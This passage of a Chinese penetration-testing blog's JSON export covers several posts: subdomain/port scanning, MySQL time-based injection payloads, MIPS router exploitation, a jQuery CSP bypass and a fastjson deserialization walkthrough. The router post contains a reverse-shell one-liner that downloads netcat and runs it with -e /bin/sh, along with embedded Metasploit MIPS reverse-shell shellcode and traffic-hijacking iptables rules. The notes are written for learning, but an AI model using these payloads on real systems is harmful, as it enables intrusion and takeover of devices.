oScan 主要分为子域名收集和端口扫描两个部分。这样，只需要输入目标域名，就能输出一个子域名以及对应ip端口扫描的报告。 子域名收集部分主要采用了主动扫描和被动 DNS 数据查询两种方式。被动 DNS 数据查询主要从 virustotal 和 dnsdb 上获取数据。此外还从 DuckDuckSearch、Google透明度报告 以及 crt.sh 上收集子域名的信息。主动扫描采用了 lijiejie 的 subDomainsBrute。对于设置了泛解析的域名会进行一次过滤操作。","text":"为了自动化日常的一些渗透测试任务，做了一个前期信息收集的轮子。ZeroScan 主要分为子域名收集和端口扫描两个部分。这样，只需要输入目标域名，就能输出一个子域名以及对应ip端口扫描的报告。 子域名收集部分主要采用了主动扫描和被动 DNS 数据查询两种方式。被动 DNS 数据查询主要从 virustotal 和 dnsdb 上获取数据。此外还从 DuckDuckSearch、Google透明度报告 以及 crt.sh 上收集子域名的信息。主动扫描采用了 lijiejie 的 subDomainsBrute。对于设置了泛解析的域名会进行一次过滤操作。dnsdb 的数据无法主动获取，需要用户自己查询并下载 json 格式放在 input 目录下。DuckDuckSearch 的结果也可以自己写入。 子域名收集完毕后进行一次检测，主要为了判断改域名是否是CNAME指向另一个域名，是否指向CDN，是否指向内网IP。实际上，一般而言如果一个域名存在CNAME记录并且指向另外一个域名的话，该域名有很大的概率指向CDN。对于指向CDN的域名和指向内网的域名，不做后续的端口扫描。 目前常用的端口扫描方式为尝试建立一个 socket 连接，如果超时活错误则认为该端口未开启。为了提高效率，这里采用了 zmap 的扫描方式，在root权限下分两个进程一个发送扫描包，一个接收结果并过滤和保存。采用 scapy 库可以很简单的实现。 1234567# send.pyfrom scapy.all import *dst_ip = '127.0.0.1'dst_port = (1, 60000)send(IP(dst=dst_ip)/TCP(dport=dst_port,flags=\"S\")) 123456789101112# recv.pyfrom scapy.all import *whitelist = ['127.0.0.1']f=\"tcp[tcpflags] &amp; tcp-syn != 0 and tcp[tcpflags] &amp; tcp-ack != 0\"def callback(pkt): #pkt.show() if pkt[IP].src in whitelist: print \"%s:%s\"%(pkt[IP].src, pkt[TCP].sport)sniff(prn=callback, filter=f, store=0) 有时候这种扫描方式会产生一些遗漏，在这里对没有端口返回的ip进行二次扫描。 在获取端口信息之后，会进行一次粗略的服务识别。对于一些常见的端口，内置了一份端口和服务的对应关系表，直接查询即可获取。对没有对应关系的端口，会发生一些探测流量，根据响应来判断服务类型。这里抄袭了A牛的InsightScan里的代码。如果还没有识别，那么就从nmap的nmap-services列表去查询。 最后会根据结果输出一份 html 的报告，一些中间结果会在 output 文件夹里保存。 参考资料https://github.com/lijiejie/subDomainsBrutehttps://github.com/AnthraX1/InsightScanhttp://biot.com/capstats/bpf.htmlhttp://www.freebuf.com/sectool/94507.html","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://5alt.me/categories/渗透测试/"}],"tags":[],"keywords":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://5alt.me/categories/渗透测试/"}]},{"title":"MySQL注入检测","slug":"MySQL注入检测","date":"2018-01-10T16:00:00.000Z","updated":"2019-08-16T04:24:28.784Z","comments":true,"path":"2018/01/MySQL注入检测/","link":"","permalink":"http://5alt.me/2018/01/MySQL注入检测/","excerpt":"SQL 注入主要分两类，一类输入是字符型的，另一类输入是整数型的。在实际情况中，测试的站点可能存在waf，同时为了减少报警，尽量发送少的请求。为了达到这个效果，需要合理的规划发送的请求，而不是把payload一股脑的打出去。 一般来说，目标的输入可能是数字，可能是个字符串。输入是数字的时候对应查询的sql语句也可能以字符串的方式进行查询。 检测注入的流程可以根据测试的结果剪枝。基本流程为先检测报错注入，再测试基于时间的注入。一般来讲，如果有waf的话，基于时间的注入会被拦截。如果没有延时的话，说明要么不在运算语句中，要么被waf拦截了，要么不存在注入。接下来根据请求的stable情况以及原始请求是否为空，进行bool型注入判断以及其他位置的注入判断。","text":"SQL 注入主要分两类，一类输入是字符型的，另一类输入是整数型的。在实际情况中，测试的站点可能存在waf，同时为了减少报警，尽量发送少的请求。为了达到这个效果，需要合理的规划发送的请求，而不是把payload一股脑的打出去。 一般来说，目标的输入可能是数字，可能是个字符串。输入是数字的时候对应查询的sql语句也可能以字符串的方式进行查询。 检测注入的流程可以根据测试的结果剪枝。基本流程为先检测报错注入，再测试基于时间的注入。一般来讲，如果有waf的话，基于时间的注入会被拦截。如果没有延时的话，说明要么不在运算语句中，要么被waf拦截了，要么不存在注入。接下来根据请求的stable情况以及原始请求是否为空，进行bool型注入判断以及其他位置的注入判断。 延时注入延时注入能适用于输入作为值情况下的注入检测，在页面无明显报错的时候优先使用延时注入的方式进行检测。延时注入一般有sleep和benchmark两种方式，这两种方式都能产生延时的效果，但是仍然有所差异。 sleepsleep函数执行成功之后返回数字0。在 and 语句中，只要有其中一个条件为假，sleep就不会执行。从实际的观察来看，sleep在各条件中的执行优先级最低。123456789101112131415161718192021mysql&gt; select 1 and sleep(1);+----------------+| 1 and sleep(1) |+----------------+| 0 |+----------------+1 row in set (1.07 sec)mysql&gt; select 0 and sleep(1);+----------------+| 0 and sleep(1) |+----------------+| 0 |+----------------+1 row in set (0.00 sec)mysql&gt; select 1 from users where sleep(1) and id=0;Empty set (0.00 sec)mysql&gt; select 1 from users where sleep(1) and id=1;Empty set (1.07 sec) 在 or 语句中，sleep的执行次数与当前列数相同，因为根据查询条件，每一列都会比较一次。 123456789101112131415161718192021mysql&gt; select count(*) from users;+----------+| count(*) |+----------+| 9 |+----------+1 row in set (0.00 sec)mysql&gt; select 1 from users where id=0 or sleep(1);Empty set (9.67 sec)mysql&gt; select 1 from users where sleep(1) or id=0;Empty set (9.63 sec)mysql&gt; select 1 from users where sleep(1) or id=1;+---+| 1 |+---+| 1 |+---+1 row in set (9.51 sec) 为了防止 or 语句中的多次延时，可以使用 (select 1 from (select sleep(5))x) 的方式来避免执行多次。123456789101112131415mysql&gt; select 1 from users where id=1 or (select 1 from (select sleep(5))x);+---+| 1 |+---+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+---+9 rows in set (5.07 sec) benchmarkbenchmark的sleep的延时表现有所差异。在 and 语句中，单纯select的时候是不会延时的，而在where语句中则会延时，即使部分条件明显为假。 123456789101112131415161718192021222324mysql&gt; select 1 and benchmark(10000000,null);+--------------------------------+| 1 and benchmark(10000000,null) |+--------------------------------+| 0 |+--------------------------------+1 row in set (2.17 sec)mysql&gt; select 0 and benchmark(10000000,null);+--------------------------------+| 0 and benchmark(10000000,null) |+--------------------------------+| 0 |+--------------------------------+1 row in set (0.00 sec)mysql&gt; select 1 from users where benchmark(10000000,null) and id=1;Empty set (2.17 sec)mysql&gt; select 1 from users where benchmark(10000000,null) and id=0;Empty set (2.15 sec)mysql&gt; select 1 from users where benchmark(10000000,null) and 0=1;Empty set (2.15 sec) 在 or 语句中，不会根据列数而多次延时。12345678910mysql&gt; select 1 from users where benchmark(10000000,null) or id=0;Empty set (2.22 sec)mysql&gt; select 1 from users where benchmark(10000000,null) or id=1;+---+| 1 |+---+| 1 |+---+1 row in set (2.18 sec) 从上面可以看到，benchmark比sleep更加好用一些。但是benchmark无法精确的控制延时的时间。 INSERT 中的延时在INSERT注入中，需要让延时语句参与运算。对于预期为字符串类型的输入，如果直接用加减或者逻辑与或等操作，很可能会导致语句出错。可以考虑用数字类型的字符串，利用mysql的类型转换功能进行操作，或者用适用于字符串的操作如like。 1234567891011121314151617181920212223242526mysql&gt; insert into users(username, isadmin)values('a'-sleep(1), 1);ERROR 1292 (22007): Truncated incorrect DOUBLE value: 'a'mysql&gt; insert into users(username, isadmin)values('a' and sleep(1)='', 1);ERROR 1292 (22007): Truncated incorrect DOUBLE value: 'a'mysql&gt; insert into users(username, isadmin)values('1'-sleep(1)-'1', 1);Query OK, 1 row affected (1.07 sec)mysql&gt; insert into users(username, isadmin)values('aaa' like sleep(1)='', 1);Query OK, 1 row affected (1.08 sec)mysql&gt; SELECT * FROM users where username='aa' like benchmark(10000000,null);+-----------------------+---------+----+| username | isadmin | id |+-----------------------+---------+----+| Herp Derper | 1 | 1 || SlapdeBack LovedeFace | 1 | 2 || Wengdack Slobdegoob | 0 | 3 || Chunk MacRunfast | 0 | 4 || Peter Weiner | 0 | 5 || aaa | 0 | 6 || 0 | 0 | 8 || 0 | 1 | 9 |+-----------------------+---------+----+8 rows in set, 6 warnings (3.82 sec) 结论在测试延时注入的时候，尽量选择用benchmark函数。对字符类型的输入，用like语句进行延时判断，对数字类型的语句可以选择逻辑运算或者加减运算。 延时注入这一步可以检测出没有waf情况下的运算语句处的注入。经过这一步，后续只需要检测存在waf的情况下注入检测以及其他位置注入检测这两种情况。 bool注入在测试完延时注入之后，用bool注入来检测存在waf的情况下运算语句位置的注入。 检测请求是否stable响应中可能包含一些与时间有关的数据，以及类似 csrftoken 之类的hash，为了防止对判断的干扰，需要去掉这类的字符串。此外，用户的输入也可能回显在页面中，有的时候也需要将输入去除。sqlmap 的方式是采用difflib.SequenceMatcher计算相同的比率，根据比率来判断网页是否相同。AWVS 中是采用正则去除可能的时间戳，然后根据输入的长度来去除响应中的输入。这两种方式都存在一些问题。在返回内容较短的情况下（如 ajax请求），计算比率会出现较大的误差。而AWVS的方式采用了写死的正则，不能保证去除所有的变化的内容。并且某些输入可能是一个常见的单词，强行替换可能会影响后续的响应比较。 最终还是选择采用 AWVS 的方式并做了一些优化。（其实可以在替换之后再计算相同的比率？） 检测原始请求是否为空在原始请求从数据库获取数据为空的时候，就很难通过 bool 型注入进行注入点的判断。 检测请求为空时响应是否和出错时相同在不同的情况下可以通过一些简单的运算以及强制类型转换的性质来判断出是否存在注入。 其他位置注入limit 注入在请求为空时采用延时注入判断，在有waf的情况下加注释符判断。 order by/group by/asc/desc 注入123order by username,1order by username asc,1 正确order by username asc,999 错误 最后附个脑图 MySQL注入检测 。 感谢雨大佬的指导~","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"qemu、iptables和交叉编译","slug":"qemu、iptables和交叉编译","date":"2018-01-07T16:00:00.000Z","updated":"2019-08-16T04:24:28.785Z","comments":true,"path":"2018/01/qemu、iptables和交叉编译/","link":"","permalink":"http://5alt.me/2018/01/qemu、iptables和交叉编译/","excerpt":"上周huiming和hyperchem大佬带我搞了一发mips的路由器，遇到了一些坑，在这儿做些记录方便以后查看。 固件解包用binwalk分离文件然后用对应的文件系统解包工具解开。 osx上可以使用 https://github.com/cinquemb/firmware-mod-kit-osx","text":"上周huiming和hyperchem大佬带我搞了一发mips的路由器，遇到了一些坑，在这儿做些记录方便以后查看。 固件解包用binwalk分离文件然后用对应的文件系统解包工具解开。 osx上可以使用 https://github.com/cinquemb/firmware-mod-kit-osx qemu 模拟执行安装qemu-user-static即可在x86的机器上执行mips的二进制文件。加载库的路径是绝对路径，要么需要chroot来执行，要么需要把库拷到对应路径。 1234567891011121314151617181920212223salt@salt:cp $(which qemu-mipsel) .salt@salt:~/rootfs$ sudo chroot . ./qemu-mips-static ./bin/busybox wgetBusyBox vv1.9.1 (2016-09-01 16:26:57 CST) multi-call binaryUsage: wget [OPTION]... HOSTwget download and upload a file via HTTPOptions: -g Download -s Upload -v Verbose -u Username to be used -p Password to be used -l Local file path -r Remote file path -P Port to be used, optional -B Bind local ip, optional -A Remote resolved ip, optional -b Transfer start position -e Transfer length -m Max transfer size -c Compress downloaded file 可以看到，在这个busybox里的wget和在普通Linux下的wget是不同的。反弹shell /bin/busybox wget -g 192.168.2.2 -l /tmp/nc -r /netcat; chmod 777 /tmp/nc;/tmp/nc 192.168.2.2 9988 -e /bin/sh 参考资料 https://wiki.debian.org/QemuUserEmulation https://github.com/multiarch/qemu-user-static https://github.com/darkerego/mips-binaries https://w00tsec.blogspot.jp/2013/09/analyzing-and-running-binaries-from.html iptables以下大部分内容引用自 https://www.zybuluo.com/yiltoncent/note/82203 在路由器命令执行的时候可以考虑用iptables命令劫持经过此路由器的流量。 iptables的结构为iptables-&gt;Tables-&gt;Chains-&gt;Rules。iptables具有Filter、NAT、Mangle、Raw四种内建表，每种表里有不同的链。如果不指定-t选项，默认就是filter表。 filter表Filter表示iptables的默认表，它具有三种内建链： INPUT链 - 处理来自外部的数据。OUTPUT链 - 处理向外发送的数据。FORWARD链 - 将数据转发到本机的其他网卡设备上。 filter表用来过滤数据包，我们可以在任何时候匹配包并过滤它们。我们就是在这里根据包的内容对包做DROP或者ACCEPT的。当然，我们也可以预先在其他地方做些过滤，但是这个表才是设计用来过滤的。几乎所有的target都可以在这儿使用。 nat表nat表有三种内建链： PREROUTING链 - 处理刚到达本机并在路由转发前的数据包。它会转换数据包中的目标IP地址，通常用于DNAT。 POSTROUTING链 - 处理即将离开本机的数据包。它会转换数据包中的源IP地址，通常用于SNAT。 OUTPUT链 - 处理本机产生的数据包。 nat表中的操作有 DNAT操作主要用在这样一种情况，你有一个合法的IP地址，要把对防火墙的访问重定向到其他的机子上。也就是说，我们改变的是数据包的目标地址，以使包能重路由到某台主机。 SNAT改变包的源地址，这极大程度上可以隐藏你的本地网络。一个很好的例子是我们知道防火墙的外部地址，但必须用这个地址替换本地网络地址。如果使用类似192.168.0.0/24这样的地址，是不会从Internet得到任何回应的。 MASQUERADE的作用如其名字一样，只是计算机的符合稍微多一点。因为对每个匹配的包，MASQUERADE都要查找可用的IP地址，而不是像SNAT用的IP地址是配置好的。当然，这也有好好处，就是我们可以通过PPP、PPPOE\\SLIP等拨号得到的地址，这些地址可能是由ISP的DHCO随机分配的。 mangle表mangle表用于指定如何处理数据包。它能改变TCP头中的QoS位。mangle表具有5个内建链。 PREROUTING OUTPUT FORWARD INPUT POSTROUTING mangle表中的操作有 TOS操作用来设置或改变数据包的服务类型域。这常用来设置网络上的数据包如何被路由等策略。它在Internet上还不能使用，而且很多路由器不会注意到这个域值。 TTL操作用来改变数据包的生存时间域，我们可以让所有数据吧只有一个特殊的TTL。可以欺骗一些ISP。 MARK用来给包设置特殊的标记。它并不改变包的内容，只是在内核中对相应的包加入标记。 常用操作iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 80 把8080端口的流量重定向到路由器的80端口iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 1.1.1.1 把80端口的流量重定向到外网ip1.1.1.1iptables -t nat -F PREROUTING 清除nat表PREROUTING链的内容 参考资料 https://wiki.openwrt.org/doc/howto/netfilter https://www.zybuluo.com/yiltoncent/note/82203 交叉编译在路由器能命令执行后，考虑下载并执行自己的payload。首先需要判断cpu的类型。 123456789101112131415161718192021salt@salt:~/rootfs/bin$ readelf -h busyboxELF Header: Magic: 7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, big endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: EXEC (Executable file) Machine: MIPS R3000 Version: 0x1 Entry point address: 0x403f80 Start of program headers: 52 (bytes into file) Start of section headers: 0 (bytes into file) Flags: 0x70001007, noreorder, pic, cpic, o32, mips32r2 Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 8 Size of section headers: 0 (bytes) Number of section headers: 0 Section header string table index: 0 通过readelf可以看出，这个elf对应运行的cpu是32位大端mips架构。因此需要编译的目标架构也如此。 uclibchttps://uclibc.org/ 有现成的交叉编译工具以及启动qemu的脚本。 可以下载已经编译好的交叉编译工具，也可以直接启动一个qemu虚拟机。 buildroot手动搭建一套交叉编译的环境。 1234sudo apt-get install build-essential bc gettext texinfo patch libncurses5-devgit clone https://github.com/buildroot/buildrootmake cleanmake menuconfig 选择对应的cpu架构和toolchain里的kernel headers的版本，make，在buildroot/output/host/usr/bin目录下找到生成的交叉编译工具。 参考资料 https://buildroot.org/download http://blog.csdn.net/QQ1084283172/article/details/68950682 docker 交叉编译环境https://github.com/dockcross/dockcross 编译shellcode用metasploit生成反弹shell的shellcode，放在c里编译。 1234567#include &lt;stdlib.h&gt;unsigned char shellcode[] = \"\\x24\\x0f\\xff\\xfa\\x01\\xe0\\x78\\x27\\x21\\xe4\\xff\\xfd\\x21\\xe5\\xff\\xfd\\x28\\x06\\xff\\xff\\x24\\x02\\x10\\x57\\x01\\x01\\x01\\x0c\\xaf\\xa2\\xff\\xff\\x8f\\xa4\\xff\\xff\\x34\\x0f\\xff\\xfd\\x01\\xe0\\x78\\x27\\xaf\\xaf\\xff\\xe0\\x3c\\x0e\\x11\\x5c\\x35\\xce\\x11\\x5c\\xaf\\xae\\xff\\xe4\\x3c\\x0e\\xc0\\xa8\\x35\\xce\\x02\\x02\\xaf\\xae\\xff\\xe6\\x27\\xa5\\xff\\xe2\\x24\\x0c\\xff\\xef\\x01\\x80\\x30\\x27\\x24\\x02\\x10\\x4a\\x01\\x01\\x01\\x0c\\x24\\x11\\xff\\xfd\\x02\\x20\\x88\\x27\\x8f\\xa4\\xff\\xff\\x02\\x20\\x28\\x21\\x24\\x02\\x0f\\xdf\\x01\\x01\\x01\\x0c\\x24\\x10\\xff\\xff\\x22\\x31\\xff\\xff\\x16\\x30\\xff\\xfa\\x28\\x06\\xff\\xff\\x3c\\x0f\\x2f\\x2f\\x35\\xef\\x62\\x69\\xaf\\xaf\\xff\\xec\\x3c\\x0e\\x6e\\x2f\\x35\\xce\\x73\\x68\\xaf\\xae\\xff\\xf0\\xaf\\xa0\\xff\\xf4\\x27\\xa4\\xff\\xec\\xaf\\xa4\\xff\\xf8\\xaf\\xa0\\xff\\xfc\\x27\\xa5\\xff\\xf8\\x24\\x02\\x0f\\xab\\x01\\x01\\x01\\x0c\";int main()&#123; ( (void (*)(void))shellcode )(); &#125; 之前编译的时候把shellcode放在了栈上，由于栈的保护机制默认是不能执行的。应该把shellcode放在data段。qemu模拟执行的时候没检查栈不可执行问题，导致模拟执行成功，实际执行失败。 或者直接用别人编译好的mips二进制文件 https://github.com/darkerego/mips-binaries/","categories":[{"name":"逆向","slug":"逆向","permalink":"http://5alt.me/categories/逆向/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://5alt.me/categories/逆向/"}]},{"title":"我是如何用Hrida自动生成签名的","slug":"我是如何用hrida自动生成签名的","date":"2017-11-08T16:00:00.000Z","updated":"2019-08-16T04:24:28.787Z","comments":true,"path":"2017/11/我是如何用hrida自动生成签名的/","link":"","permalink":"http://5alt.me/2017/11/我是如何用hrida自动生成签名的/","excerpt":"这应该是最后一次写用frida来hook安卓的东西了 = = 当然，最主要的目的还是为这个小脚本打个广告。 这次的小玩意叫Hrida，思路来自于Brida。Hrida可以看作是frida的http接口，可以通过http请求获取在frida脚本中导出函数的执行结果。 Hrida的用法见Github页面。","text":"这应该是最后一次写用frida来hook安卓的东西了 = = 当然，最主要的目的还是为这个小脚本打个广告。 这次的小玩意叫Hrida，思路来自于Brida。Hrida可以看作是frida的http接口，可以通过http请求获取在frida脚本中导出函数的执行结果。 Hrida的用法见Github页面。在检测一个APK的时候，发现一些关键请求带了签名，找来找去没有找到签名算法所在的问题，只找到了调用签名函数在java层的接口。这个接口的参数是一些自定义类型的类。目标是随意调用签名函数为自己的请求进行签名。 最开始以为frida只是一个hook工具，只能在apk里某些函数被调用的时候触发，后来想到了Brida，翻了翻源码和文档，发现frida提供了rpc的接口。通过这些接口可以方便的导出一些函数，供外部调用，而且是任意时候都能调用。在这些函数内部我们可以使用任意Java类，实例化我们想要的对象，调用特定的方法。 我们为了调用签名函数，首先需要实例化对应的类和参数。对于自定义的类，实例化的时候可能需要一层一层向前追溯。我尝试过先用hook的方式来保存一个目标类的对象的引用，然后在导出函数里使用，实践下来发现frida报了上下文环境的异常。于是只能老老实实自己构造了。 样例代码如下所示，导出了一个叫sign的函数，参数是data，其中参数以json中数组的形式传递。123456789101112131415161718// rpc.jsvar result = nullrpc.exports = &#123; sign: function(data)&#123; Java.perform(function (data) &#123; try&#123; Hrida = Java.use('me.5alt.hrida') hrida = Hrida.$new(); result = hrida.sign(data).toString() console.log(result) &#125;catch(e)&#123; console.log(e) &#125; &#125;); return result &#125;&#125; 用Hrida载入：python hrida.py -a me.5alt rpc.js。 用python调用这个接口12345678910111213import requestsimport jsonfrom urllib import quoteurl = \"http://127.0.0.1:8800/call\"method = 'sign'args = [\"md5_salt\"]payload = &#123; 'method': method, 'args': quote(json.dumps(args))&#125;print requests.post(url, data=payload).text 为了方便调用，可以在本地装一个安卓虚拟机，启动Hrida，用autossh将本地监听的端口反弹到远程vps上，这样就能在公网愉快的使用了。 参考资料https://github.com/5alt/hrida http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","categories":[{"name":"Android","slug":"Android","permalink":"http://5alt.me/categories/Android/"}],"tags":[],"keywords":[{"name":"Android","slug":"Android","permalink":"http://5alt.me/categories/Android/"}]},{"title":"jQuery里的html()","slug":"jQuery里的html()","date":"2017-09-25T16:00:00.000Z","updated":"2019-08-16T04:24:28.785Z","comments":true,"path":"2017/09/jQuery里的html()/","link":"","permalink":"http://5alt.me/2017/09/jQuery里的html()/","excerpt":"在看一个浏览器插件，发现可以在插件内部的页面中插入任意的 html 标签，但是由于 CSP 的限制，只能script-src &#39;self&#39; &#39;unsafe-eval&#39;; object-src &#39;self&#39;，并不支持unsafe-inline。 出现问题部分的代码为1g.html('&lt;iframe src=\"' + a.url + \"?id=\" + a.id '\" frameborder=\"0\" scrolling=\"no\"&gt;&lt;/iframe&gt;').show() 其中 a.url 和 a.id 没有过滤可以完全控制。思路很简单，闭合 iframe 标签插入新的标签即可。在测试的时候发现，利用 img 标签的 onerror 事件就会引发 CSP 的报警，而用 script 标签则不会。一脸懵逼。 本地搭建环境，引用最新的 jQuery 库（3.2.1），用同样的方法却发现无论 img 还是 script 标签都会触发 CSP 的报警。两脸懵逼。 问过大佬，大佬说 jQuery 的.html方法调用的是 eval，而 CSP 中允许了 unsafe-eval，所以能执行 JavaScript。三脸懵逼。","text":"在看一个浏览器插件，发现可以在插件内部的页面中插入任意的 html 标签，但是由于 CSP 的限制，只能script-src &#39;self&#39; &#39;unsafe-eval&#39;; object-src &#39;self&#39;，并不支持unsafe-inline。 出现问题部分的代码为1g.html('&lt;iframe src=\"' + a.url + \"?id=\" + a.id '\" frameborder=\"0\" scrolling=\"no\"&gt;&lt;/iframe&gt;').show() 其中 a.url 和 a.id 没有过滤可以完全控制。思路很简单，闭合 iframe 标签插入新的标签即可。在测试的时候发现，利用 img 标签的 onerror 事件就会引发 CSP 的报警，而用 script 标签则不会。一脸懵逼。 本地搭建环境，引用最新的 jQuery 库（3.2.1），用同样的方法却发现无论 img 还是 script 标签都会触发 CSP 的报警。两脸懵逼。 问过大佬，大佬说 jQuery 的.html方法调用的是 eval，而 CSP 中允许了 unsafe-eval，所以能执行 JavaScript。三脸懵逼。从原版插件中找到 jQuery，版本号为 1.8.0，在 jQuery 中搜索 eval 函数的使用，发现只有在 globalEval 中被调用。 12345globalEval: function(b) &#123; b &amp;&amp; aa.test(b) &amp;&amp; (a.execScript || function(b) &#123; a.eval.call(a, b) &#125;)(b)&#125; 既然会调用 eval，那么就在 globalEval 函数中打一下 call stack 吧。在 eval 前插入 console.log(new Error().stack);。得到函数调用栈。 123456789Function.globalEvalHTMLScriptElement.&lt;anonymous&gt;Function.each$.domManip$.append$.&lt;anonymous&gt;Function.access$.html&lt;anonymous&gt; 函数一直追踪过去可以看到，原来jQuery 的.html方法并不是 innerHTML 这么简单，在这个函数里做了一些判断，会对Ua = /&lt;(?:script|style|link)/i这样的标签进行特殊处理。如果是 script 标签会将内容 eval 执行，导致 CSP 的保护被绕过。 那么为什么最新版的 jQuery 就不存在这个问题了呢？翻了翻源码可以发现，最新版的 globalEval 函数已经变成了在 head 里 append 一个script 标签等 JavaScript 执行完之后删除。 123456789101112globalEval: function( code ) &#123; DOMEval( code );&#125;function DOMEval( code, doc ) &#123; doc = doc || document; var script = doc.createElement( \"script\" ); script.text = code; doc.head.appendChild( script ).parentNode.removeChild( script );&#125; 这样由于不是通过 eval 的方式执行 JavaScript，受到 CSP 的保护。 jQuery 中关于 globalEval 这个函数的变化也是挺有意思的。在 github 上翻了翻 commit 的历史记录。 在2013年4月3日的一次commit把 globalEval 从 eval 变成了插 script 标签的方式。而在09年的某次commit就曾经是插 script 标签的方式。 这中间到底发生了什么 =。=","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"fastjson 调试利用记录","slug":"fastjson调试利用记录","date":"2017-09-05T16:00:00.000Z","updated":"2019-08-16T04:24:28.785Z","comments":true,"path":"2017/09/fastjson调试利用记录/","link":"","permalink":"http://5alt.me/2017/09/fastjson调试利用记录/","excerpt":"前几天和雨日一个站，发现有fastjson的问题，死活利用不成功。找大佬们帮忙要来exp弹shell成功了，事后学习下原理。之前从来没搞过java，于是拉着雨对着Ricter的博客一起跟了一遍流程，带我学习了一波。","text":"前几天和雨日一个站，发现有fastjson的问题，死活利用不成功。找大佬们帮忙要来exp弹shell成功了，事后学习下原理。之前从来没搞过java，于是拉着雨对着Ricter的博客一起跟了一遍流程，带我学习了一波。 fastjson 解析过程跟了一遍 fastjson。对代码细节不关心的同学，可以直接跳过这个过程。 从 JSON.parse 开始，把PoC作为输入，F7一路跟下去，可以看到 fastjson 的解析过程。 我们输入的第一个字符为{，这表示解析出来的结果是一个 Object。1234//./src/main/java/com/alibaba/fastjson/parser/DefaultJSONParser.java:public Object parse(Object fieldName)case LBRACE: JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField)); return this.parseObject((Map)object, fieldName); 在这里调用了parseObject来继续解析。 首先遇到的是第一个key@type，然后进行了以下的判断，如果是@type并且启用了特殊key检查的话，那么就把对应的value作为类来加载。123456//./src/main/java/com/alibaba/fastjson/parser/DefaultJSONParser.java:public final Object parseObject(final Map object, Object fieldName)if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; ... ObjectDeserializer deserializer = config.getDeserializer(clazz); return deserializer.deserialze(this, clazz, fieldName);&#125; 在加载这个类的时候比较复杂，如果是java里常见的基本类型就直接新建一个对应的实例，fastjson里也内置了一些常见类的反序列化方法。由于现在我们的类并不常见，也不在内置的黑名单里，于是最终调用了createJavaBeanDeserializer来进行反序列化。1234567891011121314151617//./src/main/java/com/alibaba/fastjson/parser/ParserConfig.java:public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type)if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) &#123; ...&#125;...String className = clazz.getName();className = className.replace('$', '.');for (int i = 0; i &lt; denyList.length; ++i) &#123; //黑名单检查 String deny = denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(\"parser deny : \" + className); &#125;&#125;...derializer = this.createJavaBeanDeserializer(clazz, (Type)type);this.putDeserializer((Type)type, (ObjectDeserializer)derializer);return (ObjectDeserializer)derializer; 在JavaBeanDeserializer的构造函数里，我们发现调用了JavaBeanInfo.build。 1234//./src/main/java/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:public JavaBeanDeserializer(ParserConfig config, Class&lt;?&gt; clazz, Type type)public JavaBeanDeserializer(ParserConfig config, Class&lt;?&gt; clazz, Type type)&#123; this(config, JavaBeanInfo.build(clazz, type, config.propertyNamingStrategy));&#125; 在JavaBeanInfo.build里，会把目标类的方法和字段遍历一遍，分不同情况进行处理。类里面没有用@JSONField标记过的方法需要满足一些条件才能被加到列表里。 比如有些方法需要满足以下条件。 方法名需要大于4 不能是静态方法 返回类型要么是void要么是当前类 参数只有一个 方法名需要以set开头。 这些方法是典型的类成员变量的setter方法。通过这些方法的名字可以推测出对应的成员变量的名字。除了按照javaBean的规范来解析，fastjson还会推测一些其他的写法。 第4个字母大写或者是Unicode的方法，取set后面的字符并剩下第一个字符转成小写当做变量名 第4个字母是_，取_后面的字符当做变量名 第4个字母是f，取set后面的字符当做变量名 第5个字母大写并且长度大于5，取set后面的字符并剩下第一个字符转成小写当做变量名 12345678910//./src/main/java/com/alibaba/fastjson/util/JavaBeanInfo.java:public static JavaBeanInfo build(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy)...if (methodName.length() &lt; 4) continue;if (Modifier.isStatic(method.getModifiers())) continue;if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) continue; Class&lt;?&gt;[] types = method.getParameterTypes();if (types.length != 1) continue;...if (!methodName.startsWith(\"set\")) continue;... 同样的，对于public static fields和getter方法也会加入到列表里。 生成这些列表的时候也会判断成员变量是不是public的，会做一个标记说明是否能直接访问。12345678910//./src/main/java/com/alibaba/fastjson/util/FieldInfo.javaif (field != null) &#123; int modifiers = field.getModifiers(); fieldAccess = ((modifiers &amp; Modifier.PUBLIC) != 0 || method == null); fieldTransient = Modifier.isTransient(modifiers) || TypeUtils.isTransient(method);&#125; else &#123; fieldAccess = false; fieldTransient = false;&#125; 接下来就要进行deserialze操作了。首先遍历前面生成的类的fields表，先对他们用对应的Deserializers处理一遍。猜测这步是为了给成员变量赋一个默认的值。在遍历完成之后，再解析提交的json里的数据，调用parseField进行反序列化的处理。parseField处理了Feature.SupportNonPublicField的情况。 1234567891011121314151617181920212223242526//./src/main/java/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:protected &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features)for (int fieldIndex = 0;; fieldIndex++) &#123; boolean matchField = false; ... if (fieldIndex &lt; 